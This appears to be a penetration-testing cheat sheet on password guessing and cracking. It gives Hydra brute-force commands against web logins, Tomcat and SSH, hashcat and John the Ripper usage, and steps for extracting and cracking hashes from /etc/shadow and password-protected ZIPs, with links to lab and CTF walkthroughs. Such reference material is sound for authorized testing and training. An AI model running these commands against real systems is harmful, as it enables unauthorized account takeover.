# Password Guessing/Cracking

* **THC-Hydra**

        $ hydra -l <USER> -p <Password> <IP Address> http-post-form “<Login Page>:<Request Body>:<Error Message>”
        $ hydra -l admin -P /usr/share/wordlists/rockyou.txt domain.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
        $ hydra -L tomcat_username.lst -P /home/kali/Documents/lab/wordlist/rockyou.txt -s 8080 -f 10.10.10.4 http-get /manager/html
        $ hydra -l john -P rockyou.txt -t 6 ssh://10.10.10.NNN

* **HashCat**

        hashcat -a 0 -m 13100 ./hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule --force

* **John the Ripper**

        john --format=PuTTY --fork=4 key.hash -w=./wordlist.txt

* **findmyhash**
   Crack the password hash using [findmyhash](https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/findmyhash/findmyhash.py)

        python findmyhash.py MD5 -h “2d58e0637ec1e94cdfba3d1c26b67d01”

## Common Scenarios

### **Password-Protected ZIP**

1. Convert the password protected ZIP file into a compatible format using `zip2john` tool

        zip2john file.zip > file.hash

2. Crack the password using [john](https://www.openwall.com/john/) 

        sudo john file.hash --fork=4 -w=./rockyou.txt

### **Password Hash** 

1. Identify the hash using [hash-identifier](https://tools.kali.org/password-attacks/hash-identifier)
2. Create `hash.txt` file in following format

        username:MD5HASHVALUEHERE

3. Crack the hash using [john](https://www.openwall.com/john/)

        $ john hash.txt --format=raw-md5 --wordlist=rockyou.txt --rules
        $ sudo john hash.txt -format=raw-sha1 --wordlist=rockyou.txt --rules

### Cracking Linux Account Passwords from /etc/passwd and /etc/shadow

1. Copy contents of `/etc/passwd` into `passwd.txt`
2. Copy contents of `/etc/shadow` into `shadow.txt`
3. Combine the two files using [unshadow](http://manpages.ubuntu.com/manpages/bionic/man8/unshadow.8.html) command

        unshadow passwd.txt shadow.txt > passwords.txt

4. Crack passwords using [john](https://www.openwall.com/john/)

        $ john passwords.txt --wordlist=rockyou.txt

### Cracking a Password Hash from /etc/shadow 

1. Copy the root hash entry from `/etc/shadow` file into a separate text file `hash.txt`
2. Crack the hash using [hashcat](https://hashcat.net/hashcat/)

        hashcat -m 1800 --force hash.txt ./rockyou.txt

## References

* http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
* https://tools.kali.org/password-attacks/hydra
* [Apache Tomcat Default Credentials - Dictionary Attack Payoad](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt)
* https://www.youtube.com/watch?v=EfqJCKWtGiU
* https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/
* https://www.youtube.com/watch?v=EfqJCKWtGiU
* https://pentesterlab.com/exercises/from_sqli_to_shell/course
* https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8
* https://code.google.com/archive/p/findmyhash/
* http://manpages.ubuntu.com/manpages/bionic/man8/unshadow.8.html
* https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/
* http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
* https://linuxhint.com/crack-web-based-login-page-with-hydra-in-kali-linux/
* https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
* https://unicornsec.com/home/tryhackme-crack-the-hash